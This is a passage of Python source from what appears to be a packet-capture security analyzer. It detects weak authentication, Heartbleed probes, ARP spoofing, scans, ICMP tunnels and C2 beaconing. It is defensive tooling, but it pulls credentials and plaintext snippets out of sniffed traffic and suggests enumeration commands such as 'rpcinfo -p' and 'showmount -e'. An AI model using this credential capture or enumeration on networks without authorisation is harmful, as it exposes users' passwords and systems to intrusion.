            head = payload[:1024].decode("latin1", errors="replace")
        except Exception:
            return
        for line in head.split("\r\n"):
            kv = line.split(":", 1)
            if len(kv) != 2:
                continue
            k = kv[0].strip().lower()
            v = kv[1].strip()
            if not v:
                continue
            if k == "server":
                h = self._get_host(src)
                if not h.get("ssdp_server"):
                    h["ssdp_server"] = v[:200]
            elif k == "user-agent" and src and src != dst:
                # NOTIFY uses USER-AGENT for the same purpose on some stacks.
                h = self._get_host(src)
                if not h.get("ssdp_server"):
                    h["ssdp_server"] = v[:200]

    def _d_radius(self, src, dst, dport, payload):
        if len(payload) < 20:
            return
        code = payload[0]
        code_names = {1: "Access-Request", 2: "Access-Accept", 3: "Access-Reject",
                      4: "Accounting-Request", 11: "Access-Challenge"}
        if code not in code_names:
            return
        length = (payload[2] << 8) | payload[3]
        if length < 20 or length > len(payload):
            return
        self._add_finding("low", "weak-auth",
            f"RADIUS {code_names[code]} observed",
            f"RADIUS traffic between {src} and {dst}:{dport}. "
            f"Password attributes are MD5-encrypted with the shared secret — if the secret is "
            f"weak or captured, passwords are recoverable offline.",
            hosts=[src, dst], port=dport,
            remediation="Use long random shared secrets; prefer RadSec (RADIUS over TLS) and EAP-TLS.",
            key=("radius", src, dst))
        if code == 1:
            pos = 20
            while pos + 2 <= length:
                t = payload[pos]; l = payload[pos + 1]
                if l < 2 or pos + l > length:
                    break
                if t == 2:
                    self._add_finding("medium", "weak-auth",
                        "RADIUS Access-Request carries User-Password attribute",
                        f"{src} → {dst}:{dport} Access-Request contains the MD5-encrypted "
                        f"User-Password attribute. Capture of (request + shared_secret) allows "
                        f"offline password recovery.",
                        hosts=[src, dst], port=dport,
                        remediation="Use EAP-TLS / PEAP-MSCHAPv2 with RadSec.",
                        key=("radius-pap", src, dst))
                    break
                pos += l

    def _d_rdp(self, src, dst, dport, payload):
        self._add_finding("info", "rdp",
            "RDP traffic observed",
            f"{src} → {dst}:{dport} Remote Desktop. Verify NLA is required and patch level "
            f"(CVE-2019-0708 BlueKeep applies to unpatched 2003/XP/7/2008).",
            hosts=[src, dst], port=dport,
            remediation="Require NLA (CredSSP); disable RDP Security Layer 0 (Standard); patch BlueKeep.",
            key=("rdp", dst))
        if b"Cookie: mstshash=" in payload[:64]:
            try:
                m = re.search(rb"Cookie: mstshash=([^\r\n]+)", payload[:128])
                if m:
                    user = m.group(1).decode("ascii", errors="replace")
                    self._add_credential(src, dst, dport, "RDP-Cookie", username=user)
                    self._add_finding("medium", "recon",
                        f"RDP mstshash cookie: {user}",
                        f"{src} → {dst}:{dport} advertises RDP client cookie 'mstshash={user}'. "
                        f"Used for load balancing but leaks the username being attempted.",
                        hosts=[src, dst], port=dport, evidence=user[:80],
                        remediation="Noise-level disclosure; ensure NLA is required and monitor for brute force.",
                        key=("rdp-mstshash", src, dst, user))
            except Exception:
                pass

    def _d_vnc_none(self, src, dst, payload):
        # RFB SecurityTypes: [count][types...]; count=1, type=1 = "None" (no auth).
        if len(payload) >= 2 and payload[0] == 1 and payload[1] == 1:
            self._add_finding("critical", "weak-auth",
                "VNC server with no authentication (type 'None')",
                f"{dst}:5900 offered VNC security type 1 (None) to {src}. Full desktop control "
                f"with zero authentication.",
                hosts=[dst, src], port=5900,
                remediation="Set a VNC password; tunnel via SSH; consider a modern remote-access tool.",
                key=("vnc-none", dst))

    def _d_portmap(self, src, dst, dport):
        self._add_finding("medium", "exposed-service",
            "Portmap / rpcbind on :111",
            f"{src} → {dst}:111. rpcbind advertises registered RPC services (mountd, nfsd, nlockmgr) — "
            f"run `rpcinfo -p {dst}` to enumerate.",
            hosts=[src, dst], port=dport,
            remediation="Restrict rpcbind to management networks; block :111 at the perimeter.",
            key=("rpcbind", dst))

    def _d_nfs(self, src, dst, dport):
        self._add_finding("high", "plaintext-protocol",
            "NFS traffic on :2049",
            f"NFS {src} ↔ {dst}:2049. Default NFS is UID/GID based with no authentication. "
            f"Enumerate exports: `showmount -e {dst}`.",
            hosts=[src, dst], port=dport,
            remediation="Require Kerberos auth (sec=krb5p); export only to trusted hosts.",
            key=("nfs", dst))

    def _d_heartbleed(self, src, dst, port, payload):
        # TLS heartbeat (type 24) advertising payload_length > record_length = Heartbleed.
        if len(payload) < 8:
            return
        if payload[0] == 0x18 and payload[1] == 0x03 and payload[2] in (0x01, 0x02, 0x03):
            rec_len = (payload[3] << 8) | payload[4]
            if rec_len < 30 and len(payload) >= 8 and payload[5] == 0x01:
                hb_len = (payload[6] << 8) | payload[7]
                if hb_len > rec_len:
                    self._add_finding("critical", "vuln-version",
                        "Heartbleed probe (CVE-2014-0160)",
                        f"{src} → {dst}:{port} sent a TLS heartbeat claiming {hb_len} bytes of payload "
                        f"inside a {rec_len}-byte record. Classic Heartbleed exploit shape.",
                        hosts=[src, dst], port=port,
                        evidence=f"hb_len={hb_len} rec_len={rec_len}",
                        remediation="Patch OpenSSL ≥1.0.1g; rotate keys if any server responded.",
                        key=("heartbleed", dst, port))

    def _process_packet(self, pkt):
        with self.lock:
            self._process_packet_inner(pkt)

    def _process_packet_inner(self, pkt):
        ts = float(pkt.time) if hasattr(pkt, "time") else None
        if ts:
            if self.start_time is None or ts < self.start_time:
                self.start_time = ts
            if self.end_time is None or ts > self.end_time:
                self.end_time = ts

        if ARP in pkt:
            self._d_arp(pkt)
            return

        if IP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            proto_num = pkt[IP].proto
        elif IPv6 is not None and IPv6 in pkt:
            src = pkt[IPv6].src
            dst = pkt[IPv6].dst
            proto_num = pkt[IPv6].nh
            self._d_icmpv6_ra(pkt, src)
        else:
            return

        size = len(pkt)
        src_host = self._get_host(src)
        dst_host = self._get_host(dst)
        src_host["packets_out"] += 1
        src_host["bytes_out"] += size
        dst_host["packets_in"] += 1
        dst_host["bytes_in"] += size
        src_host["peers"].add(dst)
        dst_host["peers"].add(src)

        flow = self._get_flow(src, dst)
        flow["packets"] += 1
        flow["bytes"] += size

        if TCP in pkt:
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            try:
                flags = int(pkt[TCP].flags)
            except Exception:
                flags = 0
            payload_bytes = bytes(pkt[Raw].load) if Raw in pkt else b""
            flow["protocols"].add("TCP")
            src_host["protocols"].add("TCP")
            dst_host["protocols"].add("TCP")
            flow["ports"].add(dport)
            src_host["ports_connecting"].add(dport)
            dst_host["ports_listening"].add(dport)

            # SYN without ACK identifies a scan probe, not an established reply.
            if (flags & 0x02) and not (flags & 0x10):
                self.scan_pairs[src].add((dst, dport))
                self.scan_dport_by_dst[src][dst].add(dport)

            if ts:
                lst = self.flow_ts[(src, dst, dport)]
                if len(lst) < 500:
                    lst.append(ts)

            self._d_suspicious_port(src, dst, dport)
            self._d_ics(src, dst, dport)
            self._d_insecure_mgmt(src, dst, dport)

            svc, plaintext = classify_port(dport)
            if svc is None:
                svc, plaintext = classify_port(sport)
            if svc:
                flow["services"].add(svc)
                if plaintext:
                    flow["plaintext"] = True
                    src_host["plaintext_services"].add(svc)
                    dst_host["plaintext_services"].add(svc)
                    if payload_bytes:
                        try:
                            self._extract_creds(src, dst, sport, dport, payload_bytes)
                            if len(self.plaintext_samples[(src, dst, dport)]) < 3:
                                snippet = payload_bytes[:200].decode("utf-8", errors="replace")
                                if any(c.isprintable() for c in snippet):
                                    self.plaintext_samples[(src, dst, dport)].append({
                                        "service": svc,
                                        "snippet": snippet.replace("\r", "\\r").replace("\n", "\\n"),
                                    })
                        except Exception:
                            pass
                else:
                    src_host["encrypted_services"].add(svc)
                    dst_host["encrypted_services"].add(svc)

            if payload_bytes:
                try:
                    self._d_ntlm(src, dst, dport, payload_bytes)
                    if dport == 88 or sport == 88:
                        self._d_kerberos(src, dst, 88, payload_bytes)
                    if dport in (139, 445) or sport in (139, 445):
                        self._d_smb(src, dst, dport if dport in (139, 445) else sport, payload_bytes)
                        self._d_gpp_cpassword(src, dst, payload_bytes)
                    if dport in (443, 8443, 636, 993, 995) or sport in (443, 8443, 636, 993, 995):
                        self._d_tls(src, dst, dport, payload_bytes)
                        self._d_heartbleed(src, dst, dport, payload_bytes)
                    if dport == 389 or sport == 389:
                        self._d_ldap_bind(src, dst, payload_bytes)
                    if dport == 4786 or sport == 4786:
                        self._d_cisco_smi(src, dst)
                    if dport in (80, 8080, 8000, 8888) or sport in (80, 8080, 8000, 8888):
                        try:
                            http_text = payload_bytes[:4096].decode("utf-8", errors="replace")
                            http_port = dport if dport in (80, 8080, 8000, 8888) else sport
                            self._d_http_payload(src, dst, http_port, http_text)
                            self._d_binary_secrets(src, dst, http_port, payload_bytes[:8192])
                            # Responses originate from the server; key hygiene checks off the server side.
                            if http_text.startswith("HTTP/"):
                                self._d_http_response(src, dst, sport if sport in (80,8080,8000,8888) else dport, http_text)
                            # Global HTTP req/resp pair feed.
                            self._d_http_transaction(ts, src, dst, sport, dport, http_text)
                        except Exception:
                            pass
                    if dport == 3389 or sport == 3389:
                        self._d_rdp(src, dst, 3389, payload_bytes)
                    if dport == 5900 or sport == 5900:
                        self._d_vnc_none(src, dst, payload_bytes)
                    if dport == 111 or sport == 111:
                        self._d_portmap(src, dst, 111)
                    if dport == 2049 or sport == 2049:
                        self._d_nfs(src, dst, 2049)
                    if dport in (21, 22, 25, 2222, 3306) or sport in (21, 22, 25, 2222, 3306):
                        banner_port = dport if dport in (21, 22, 25, 2222, 3306) else sport
                        self._d_banner(src, dst, banner_port, payload_bytes)
                    if dport in (6667, 6697) or sport in (6667, 6697) \
                            or (len(payload_bytes) >= 6 and payload_bytes[:5] in (b"NICK ", b"JOIN ", b"USER ", b"PING ", b"PONG ")):
                        self._d_irc_c2(src, dst, dport, payload_bytes)
                except Exception:
                    pass

            self._store_packet(ts, src, dst, "TCP", size,
                               sport=sport, dport=dport, flags=flags,
                               payload=payload_bytes, service=svc)

        elif UDP in pkt:
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            flow["protocols"].add("UDP")
            src_host["protocols"].add("UDP")
            dst_host["protocols"].add("UDP")
            flow["ports"].add(dport)
            src_host["ports_connecting"].add(dport)
            dst_host["ports_listening"].add(dport)

            payload = bytes(pkt[Raw].load) if Raw in pkt else b""

            if dport in (5355, 137, 5353):
                self._d_name_resolution(src, dst, dport, payload)
            if dport in (67, 68) or sport in (67, 68):
                self._d_dhcp(pkt, src)
            if dport == 547:
                self._d_dhcpv6(src, dst)
            if dport == 69 or sport == 69:
                self._d_tftp(src, dst)
            if dport == 88 or sport == 88:
                self._d_kerberos(src, dst, 88, payload)
            if dport == 123 or sport == 123:
                self._d_ntp_mon(src, dst, payload)
            if dport == 1900 or sport == 1900:
                self._d_ssdp(src, dst, payload)
            if dport in (1812, 1813) or sport in (1812, 1813):
                self._d_radius(src, dst, dport if dport in (1812, 1813) else sport, payload)
            if dport == 111 or sport == 111:
                self._d_portmap(src, dst, 111)
            if dport == 2049 or sport == 2049:
                self._d_nfs(src, dst, 2049)

            svc, plaintext = classify_port(dport)
            if svc is None:
                svc, plaintext = classify_port(sport)
            if svc:
                flow["services"].add(svc)
                if plaintext:
                    flow["plaintext"] = True
                    src_host["plaintext_services"].add(svc)
                    dst_host["plaintext_services"].add(svc)
                    if payload:
                        try:
                            self._extract_creds(src, dst, sport, dport, payload)
                        except Exception:
                            pass
                else:
                    src_host["encrypted_services"].add(svc)
                    dst_host["encrypted_services"].add(svc)

            if DNS is not None and DNS in pkt:
                dns = pkt[DNS]
                if dns.qr == 0 and dns.qd:
                    try:
                        qname = dns.qd.qname.decode("utf-8", errors="replace").rstrip(".")
                        qtype = int(dns.qd.qtype)
                        self.dns_queries.append({
                            "ts": ts, "src": src, "query": qname, "qtype": qtype,
                        })
                        src_host["dns_names"].add(qname)
                        self._d_dns_extras(qname, src)
                        self._d_dns_query_vuln(qname, qtype, src)
                    except Exception:
                        pass
                elif dns.qr == 1 and (dns.an or dns.ar):
                    self._d_dns_response(src, dport, dns)

            self._store_packet(ts, src, dst, "UDP", size,
                               sport=sport, dport=dport,
                               payload=payload, service=svc)

        elif ICMP in pkt:
            flow["protocols"].add("ICMP")
            src_host["protocols"].add("ICMP")
            dst_host["protocols"].add("ICMP")
            itype = icode = None
            try:
                itype = int(pkt[ICMP].type)
                icode = int(pkt[ICMP].code)
                if itype == 8:
                    self.icmp_targets[src].add(dst)
            except Exception:
                pass
            icmp_payload = bytes(pkt[Raw].load) if Raw in pkt else b""
            if itype in (0, 8) and len(icmp_payload) > 128:
                self._add_finding("medium", "tunneling",
                    "Large ICMP payload (possible tunnel)",
                    f"ICMP {src} → {dst} carrying {len(icmp_payload)}-byte payload. "
                    f"Standard ping is ~32 bytes — oversized payloads are consistent with ICMP tunnels "
                    f"(icmpsh, ptunnel, hans).",
                    hosts=[src, dst], evidence=f"{len(icmp_payload)} bytes",
                    remediation="Rate-limit and size-limit ICMP at the perimeter; alert on echo >100 bytes.",
                    key=("icmp-tunnel", src, dst))
            self._store_packet(ts, src, dst, "ICMP", size,
                               payload=icmp_payload, service="ICMP",
                               extras={"type": itype, "code": icode})
        else:
            self._store_packet(ts, src, dst, f"IP/{proto_num}", size)

    def _finalize(self):
        # Roll up device identity for every host.
        for ip, h in self.hosts.items():
            # Skip multicast / broadcast / unspecified pseudo-hosts.
            if h.get("is_multicast") or ip in ("0.0.0.0", "255.255.255.255", "::"):
                continue
            # 1. Backfill MAC from arp_table if we learned it there but the host record missed.
            if not h.get("mac"):
                macs = self.arp_table.get(ip)
                if macs:
                    h["mac"] = next(iter(macs))
            # 2. Backfill DHCP hints stashed under MAC (DISCOVER from 0.0.0.0).
            if h.get("mac") and h["mac"] in self._dhcp_by_mac:
                stash = self._dhcp_by_mac[h["mac"]]
                if stash.get("hostname") and not h.get("dhcp_hostname"):
                    h["dhcp_hostname"] = stash["hostname"]
                if stash.get("vendor_class") and not h.get("dhcp_vendor_class"):
                    h["dhcp_vendor_class"] = stash["vendor_class"]
            # 3. Vendor from MAC OUI.
            if not h.get("vendor"):
                h["vendor"] = lookup_vendor(h.get("mac"))
            # 4. Hostname: pick the best across all sources.
            if not h.get("hostname"):
                h["hostname"] = pick_hostname(h)
            # 5. Device-type heuristic.
            if not h.get("device_type"):
                h["device_type"] = infer_device_type(h)
            # 6. Reputation re-check — feeds may have finished loading after the
            # initial _get_host call set tags to [].
            if not h.get("reputation_tags"):
                self._check_reputation(ip)
            # 7. Device-specific exposure detector — emits findings keyed on the
            # vendor / device_type / SSDP-Server / ports the prior steps populated.
            self._d_device_recon(ip, h)

        for ip, macs in self.arp_table.items():
            if len(macs) > 1:
                self._add_finding("critical", "arp-spoof",
                    f"IP {ip} bound to multiple MACs",
                    f"Possible ARP spoofing: {ip} seen from {len(macs)} MACs — {', '.join(sorted(macs))}. "
                    f"An attacker on the same L2 segment may be performing ARP poisoning (ettercap/bettercap).",
                    hosts=[ip], evidence=", ".join(sorted(macs)),
                    remediation="Enable DAI (Dynamic ARP Inspection) on the switch; static ARP for critical hosts.",
                    key=("arp-dup", ip))

        for src, pairs in self.scan_pairs.items():
            by_port = defaultdict(set)
            for (d, p) in pairs:
                by_port[p].add(d)
            for port, ds in by_port.items():
                if len(ds) >= 20:
                    self._add_finding("medium", "recon",
                        f"Horizontal scan from {src} on :{port}",
                        f"{src} sent SYN to :{port} across {len(ds)} distinct hosts — "
                        f"service sweep.",
                        hosts=[src], port=port, evidence=f"{len(ds)} targets",
                        remediation="Block scanning source; investigate {src} for compromise.",
                        key=("hscan", src, port))
            for dst, ports in self.scan_dport_by_dst[src].items():
                if len(ports) >= 30:
                    self._add_finding("medium", "recon",
                        f"Vertical port scan: {src} → {dst}",
                        f"{src} probed {len(ports)} TCP ports on {dst}.",
                        hosts=[src, dst], evidence=f"{len(ports)} ports",
                        remediation="Investigate {src}; add IDS/IPS signatures.",
                        key=("vscan", src, dst))

        for src, targets in self.icmp_targets.items():
            if len(targets) >= 20:
                self._add_finding("low", "recon",
                    f"ICMP ping sweep from {src}",
                    f"{src} sent echo-request to {len(targets)} distinct hosts — classic host discovery.",
                    hosts=[src], evidence=f"{len(targets)} targets",
                    remediation="Filter/rate-limit ICMP echo at the perimeter if not operationally needed.",
                    key=("sweep", src))

        for (src, dst, dport), times in self.flow_ts.items():
            if len(times) < 8:
                continue
            times = sorted(times)
            intervals = [times[i + 1] - times[i] for i in range(len(times) - 1)]
            if not intervals:
                continue
            mean = sum(intervals) / len(intervals)
            if mean < 0.5 or mean > 1800:
                continue
            var = sum((i - mean) ** 2 for i in intervals) / len(intervals)
            std = math.sqrt(var)
            if mean > 0 and (std / mean) < 0.25 and len(times) >= 10:
                self._add_finding("medium", "beaconing",
                    f"Regular beaconing {src} → {dst}:{dport}",
                    f"{len(times)} packets at ~{mean:.1f}s intervals (σ/μ={std/mean:.2f}). "
                    f"Periodic, low-jitter pattern consistent with C2 beacon (Cobalt Strike / Sliver / Meterpreter).",
                    hosts=[src, dst], port=dport,
                    evidence=f"n={len(times)} mean={mean:.1f}s std={std:.2f}s",
                    remediation="Triage {src} — check for unauthorized processes; check {dst} reputation.",
                    key=("beacon", src, dst, dport))

        for (src, dst), f in self.flows.items():
            if is_multicast_or_broadcast(src) or is_multicast_or_broadcast(dst):
                continue
            s_priv = is_private(src)
            d_priv = is_private(dst)
            for port in f["ports"]:
                if port not in EXPOSED_SENSITIVE_PORTS:
                    continue
                svc = (PLAINTEXT_PORTS.get(port) or ENCRYPTED_PORTS.get(port)
                       or COMMON_PORTS.get(port) or str(port))
                if s_priv and not d_priv:
                    self._add_finding("high", "exposed-service",
                        f"Internal host talking to public {svc} ({port})",
                        f"{src} (internal) → {dst}:{port}/{svc} on public internet. Either an "
                        f"exposed internet service on {dst} or outbound sensitive protocol.",
                        hosts=[src, dst], port=port,
                        remediation="Confirm this traffic is intended; restrict outbound at firewall.",
                        key=("egress-sens", src, port, dst))
                elif not s_priv and not d_priv:
                    self._add_finding("high", "exposed-service",
                        f"Public-to-public {svc} traffic ({port})",
                        f"{src} ↔ {dst}:{port}/{svc} traverses the public internet.",
                        hosts=[src, dst], port=port,
                        remediation="Tunnel via VPN or put behind private subnets.",
                        key=("public-public-sens", dst, port))

        listeners_ext = defaultdict(lambda: defaultdict(set))
        for (src, dst), f in self.flows.items():
            if is_private(src) or is_multicast_or_broadcast(src):
                continue
            for port in f["ports"]:
                if port in EXPOSED_SENSITIVE_PORTS:
                    listeners_ext[dst][port].add(src)
        for dst, ports in listeners_ext.items():
            for port, srcs in ports.items():
                if len(srcs) >= 3:
                    self._add_finding("high", "exposed-service",
                        f"{dst} accepts {port} from {len(srcs)} external sources",
                        f"Multiple external peers connect to {dst}:{port} — service is internet-exposed.",
                        hosts=[dst], port=port,
                        evidence=f"{len(srcs)} unique external clients",
                        remediation="Place service behind VPN or allowlist by IP.",
                        key=("multi-ext-listen", dst, port))

    def analyze_attack_paths(self):
        with self.lock:
            by_category = defaultdict(list)
            for f in self.findings:
                by_category[f["category"]].append(f)

            active = []
            for recipe in ATTACK_PATHS:
                cats = recipe.get("match_any_category", [])
                candidates = []
                for cat in cats:
                    candidates.extend(by_category.get(cat, []))
                subs = recipe.get("match_substring") or []
                if subs:
                    filt = []
                    lows = [s.lower() for s in subs]
                    for f in candidates:
                        hay = (f["title"] + " " + str(f.get("evidence") or "")).lower()
                        if any(s in hay for s in lows):
                            filt.append(f)
                    candidates = filt
                if not candidates:
                    continue
                amps = []
                for c in recipe.get("amplifiers", []):
                    amps.extend(by_category.get(c, []))
                hosts = sorted({h for f in candidates for h in (f.get("hosts") or [])})
                active.append({
                    "id": recipe["id"],
                    "name": recipe["name"],
                    "severity": recipe["severity"],
                    "phase": recipe.get("phase", ""),
                    "description": recipe["description"],
                    "steps": recipe["steps"],
                    "tools": recipe.get("tools", []),
                    "affected_hosts": hosts,
                    "evidence_count": len(candidates),
                    "evidence_ids": [f["id"] for f in candidates[:30]],
                    "amplifier_count": len(amps),
                })
            active.sort(key=lambda p: (SEVERITY_RANK.get(p["severity"], 99), p["phase"]))
            return active

    def summary(self):
        with self.lock:
            sev_counts = Counter(f["severity"] for f in self.findings)
            live = live_capture.status() if live_capture else None
            return {
                "file": self.source_label,
                "total_packets": self.total_packets,
                "parse_errors": self.parse_errors,
                "host_count": len(self.hosts),
                "flow_count": len(self.flows),
                "start_time": self.start_time,
                "end_time": self.end_time,
                "duration_sec": (self.end_time - self.start_time) if self.start_time else 0,
                "plaintext_flows": sum(1 for f in self.flows.values() if f["plaintext"]),
                "dns_query_count": len(self.dns_queries),
                "credential_count": len(self.credentials),
                "finding_count": len(self.findings),
                "findings_by_severity": {k: sev_counts.get(k, 0)
                                         for k in ["critical", "high", "medium", "low", "info"]},
                "live": live,
                # Count of public hosts that still don't have whois fields populated.
                # The UI polls while this is nonzero so labels light up as RDAP responses land.
                "whois_pending": sum(
                    1 for h in self.hosts.values()
                    if not (h.get("is_private") or h.get("is_multicast"))
                       and h.get("whois_org") is None and h.get("whois_country") is None
                ),
                "http_txn_count": len(self.http_txns),
                # Reputation-feed status, useful in the UI banner.
                "reputation": {
                    "ready": reputation_feeds.ready.is_set(),
                    "feeds": list(reputation_feeds.feed_stats.values()),
                    "malicious_hosts": sum(1 for h in self.hosts.values() if h.get("malicious")),
                },
            }

    def to_graph_json(self):
        with self.lock:
            nodes = [{
                "id": ip,
                "is_private": h["is_private"],
                "is_multicast": h["is_multicast"],
                "packets": h["packets_in"] + h["packets_out"],
                "bytes": h["bytes_in"] + h["bytes_out"],
                "peer_count": len(h["peers"]),
                "has_plaintext": len(h["plaintext_services"]) > 0,
                "plaintext_services": sorted(h["plaintext_services"]),
                "encrypted_services": sorted(h["encrypted_services"]),
                "protocols": sorted(h["protocols"]),
                "risk_score": h["risk_score"],
                "finding_count": len(h["finding_keys"]),
                # identity fields surfaced into the graph for labeling & tooltips
                "mac": h.get("mac"),
                "vendor": h.get("vendor"),
                "hostname": h.get("hostname"),
                "device_type": h.get("device_type"),
                "whois_org": h.get("whois_org"),
                "whois_country": h.get("whois_country"),
                "whois_asn": h.get("whois_asn"),
                "rdns_name": h.get("rdns_name"),
                "malicious": h.get("malicious", False),
                "reputation_tags": h.get("reputation_tags") or [],
            } for ip, h in self.hosts.items()]
            links = [{
                "source": src,
                "target": dst,
                "packets": f["packets"],
                "bytes": f["bytes"],
                "protocols": sorted(f["protocols"]),
                "services": sorted(f["services"]),
                "plaintext": f["plaintext"],
                "port_count": len(f["ports"]),
            } for (src, dst), f in self.flows.items()]
            return {"nodes": nodes, "links": links}

    def host_detail(self, ip):
      with self.lock:
        if ip not in self.hosts:
            return None
        h = self.hosts[ip]
        inbound, outbound = [], []
        for (s, d), f in self.flows.items():
            if d == ip:
                inbound.append({
                    "peer": s, "packets": f["packets"], "bytes": f["bytes"],
                    "services": sorted(f["services"]), "protocols": sorted(f["protocols"]),
                    "plaintext": f["plaintext"], "ports": sorted(f["ports"])[:20],
                })
            if s == ip:
                outbound.append({
                    "peer": d, "packets": f["packets"], "bytes": f["bytes"],
                    "services": sorted(f["services"]), "protocols": sorted(f["protocols"]),
                    "plaintext": f["plaintext"], "ports": sorted(f["ports"])[:20],
                })
        inbound.sort(key=lambda x: -x["bytes"])
        outbound.sort(key=lambda x: -x["bytes"])

        samples = []
        for (s, d, port), snips in self.plaintext_samples.items():
            if s == ip or d == ip:
                for snip in snips:
                    samples.append({
                        "src": s, "dst": d, "port": port,
                        "service": snip["service"], "snippet": snip["snippet"],
                    })

        host_creds = [c for c in self.credentials if c["src"] == ip or c["dst"] == ip]
        host_findings = sorted(
            [self.findings[i] for i in h["finding_keys"]],
            key=lambda f: (SEVERITY_RANK.get(f["severity"], 99), f["category"]),
        )

        return {
            "ip": ip,
            "is_private": h["is_private"],
            "is_multicast": h["is_multicast"],
            "packets_in": h["packets_in"],
            "packets_out": h["packets_out"],
            "bytes_in": h["bytes_in"],
            "bytes_out": h["bytes_out"],
            "peer_count": len(h["peers"]),
            "ports_listening": sorted(h["ports_listening"])[:50],
            "ports_connecting": sorted(h["ports_connecting"])[:50],
            "protocols": sorted(h["protocols"]),
            "plaintext_services": sorted(h["plaintext_services"]),
            "encrypted_services": sorted(h["encrypted_services"]),
            "dns_names": sorted(h["dns_names"])[:30],
            "sni_names": sorted(h.get("sni_names", set()))[:30],
            "inbound_flows": inbound[:30],
            "outbound_flows": outbound[:30],
            "plaintext_samples": samples[:20],
            "credentials": host_creds[:50],
            "findings": host_findings[:80],
            "risk_score": h["risk_score"],
            "mac": h.get("mac"),
            "vendor": h.get("vendor"),
            "hostname": h.get("hostname"),
            "device_type": h.get("device_type"),
            "dhcp_hostname": h.get("dhcp_hostname"),
            "dhcp_vendor_class": h.get("dhcp_vendor_class"),
            "nbns_name": h.get("nbns_name"),
            "mdns_local_name": h.get("mdns_local_name"),
            "ssdp_server": h.get("ssdp_server"),
            "rdns_name": h.get("rdns_name"),
            "whois_org": h.get("whois_org"),
            "whois_country": h.get("whois_country"),
            "whois_asn": h.get("whois_asn"),
            "malicious": h.get("malicious", False),
            "reputation_tags": h.get("reputation_tags") or [],
        }


_TCP_FLAG_BITS = [("F", 0x01), ("S", 0x02), ("R", 0x04), ("P", 0x08),
                  ("A", 0x10), ("U", 0x20), ("E", 0x40), ("C", 0x80)]


def tcp_flags_str(f):
    if f is None:
        return None
    return "".join(n for n, m in _TCP_FLAG_BITS if f & m) or "0"


def serialize_packet(p, include_payload=False):
    out = {
        "id": p["id"],
        "ts": p["ts"],
        "src": p["src"], "dst": p["dst"],
        "sport": p.get("sport"), "dport": p.get("dport"),
        "proto": p["proto"],
        "size": p["size"],
        "flags": p.get("flags"),
        "flags_str": tcp_flags_str(p.get("flags")) if p["proto"] == "TCP" else None,
        "service": p.get("service"),
        "extras": p.get("extras") or {},
        "payload_len": p.get("payload_len", 0),
    }
    if include_payload:
        b = p.get("payload") or b""
        out["payload_b64"] = base64.b64encode(b).decode("ascii")
        out["payload_truncated"] = p.get("payload_len", 0) > len(b)
    else:
        b = p.get("payload") or b""
        out["preview_ascii"] = "".join(
            chr(x) if 0x20 <= x < 0x7f else "." for x in b[:48]
        )
    return out


class LiveCapture:
    def __init__(self):
        self.analysis = None
        self.iface = None
        self.bpf = None
        self.thread = None
        self._stop = threading.Event()
        self._finalize_thread = None
        self.started_at = None
        self.error = None

        self._pcap_writer = None
        self._pcap_path = None
        self._pcap_packets_written = 0
        self._pcap_lock = threading.Lock()

    def configure(self, analysis, iface, bpf=None):
        self.analysis = analysis
        self.iface = iface
        self.bpf = bpf

    def is_running(self):
        return bool(self.thread and self.thread.is_alive())

    def status(self):
        return {
            "running": self.is_running(),
            "iface": self.iface,
            "bpf": self.bpf,
            "started_at": self.started_at,
            "error": self.error,
            "save": self.save_status(),
        }

    def start(self):
        if self.is_running() or self.analysis is None:
            return
        self.error = None
        self._stop.clear()
        self.started_at = time.time()
        self.thread = threading.Thread(target=self._run, name="pcap-sniff", daemon=True)
        self.thread.start()
        if not self._finalize_thread or not self._finalize_thread.is_alive():
            self._finalize_thread = threading.Thread(target=self._periodic_finalize,
                                                     name="pcap-finalize", daemon=True)
            self._finalize_thread.start()

    def stop(self):
        self._stop.set()
        self.stop_saving()

    def start_saving(self, path=None):
        with self._pcap_lock:
            if self._pcap_writer:
                return self._pcap_path
            if not path:
                stamp = time.strftime("%Y%m%d-%H%M%S")
                path = os.path.join(tempfile.gettempdir(), f"deadfall-{stamp}.pcap")
            # sync=True flushes after every packet so download always sees a consistent file.
            self._pcap_writer = PcapWriter(path, append=False, sync=True)
            self._pcap_path = path
            self._pcap_packets_written = 0
            return path

    def stop_saving(self):
        with self._pcap_lock:
            if self._pcap_writer:
                try:
                    self._pcap_writer.flush()
                    self._pcap_writer.close()
                except Exception:
                    pass
                self._pcap_writer = None

    def save_status(self):
        with self._pcap_lock:
            size = None
            if self._pcap_path:
                try:
                    size = os.path.getsize(self._pcap_path)
                except Exception:
                    size = None
            return {
                "saving": self._pcap_writer is not None,
                "path": self._pcap_path,
                "packets_written": self._pcap_packets_written,
                "bytes_written": size,
            }

    def flush_saved(self):
        with self._pcap_lock:
            if self._pcap_writer:
                try:
                    self._pcap_writer.flush()
                except Exception:
                    pass

    def _write_packet_to_pcap(self, pkt):
        with self._pcap_lock:
            if self._pcap_writer:
                try:
                    self._pcap_writer.write(pkt)
                    self._pcap_packets_written += 1
                except Exception:
                    pass

    def _run(self):
        def handle(pkt):
            # Write to pcap first so a save never misses a packet, even if analysis errors.
            self._write_packet_to_pcap(pkt)
            self.analysis.ingest_live_packet(pkt)

        try:
            sniff(iface=self.iface, prn=handle, store=False,
                  filter=self.bpf,
                  stop_filter=lambda p: self._stop.is_set())
        except PermissionError as e:
            self.error = f"permission denied — run as root (or with CAP_NET_RAW): {e}"
            print(f"[!] {self.error}", file=sys.stderr)
        except Exception as e:
            self.error = str(e)
            print(f"[!] capture error: {e}", file=sys.stderr)
        finally:
            self.stop_saving()

    def _periodic_finalize(self):
        while not self._stop.is_set():
            if self._stop.wait(10.0):
                break
            try:
                self.analysis._finalize()
            except Exception as e:
                print(f"[!] finalize error: {e}", file=sys.stderr)


class WhoisCache:
    def __init__(self):
        self.cache = {}
        self.lock = threading.Lock()

    def lookup(self, ip):
        with self.lock:
            if ip in self.cache:
                return self.cache[ip]
        if is_private(ip) or is_multicast_or_broadcast(ip):
            result = {"ip": ip, "private": True, "note": "RFC1918/multicast — no WHOIS"}
            with self.lock:
                self.cache[ip] = result
            return result
        if not HAS_IPWHOIS:
            result = {"ip": ip, "error": "ipwhois not installed"}
            with self.lock:
                self.cache[ip] = result
            return result
        try:
            w = IPWhois(ip)
            r = w.lookup_rdap(depth=1)
            result = {
                "ip": ip,
                "asn": r.get("asn"),
                "asn_description": r.get("asn_description"),
                "asn_country": r.get("asn_country_code"),
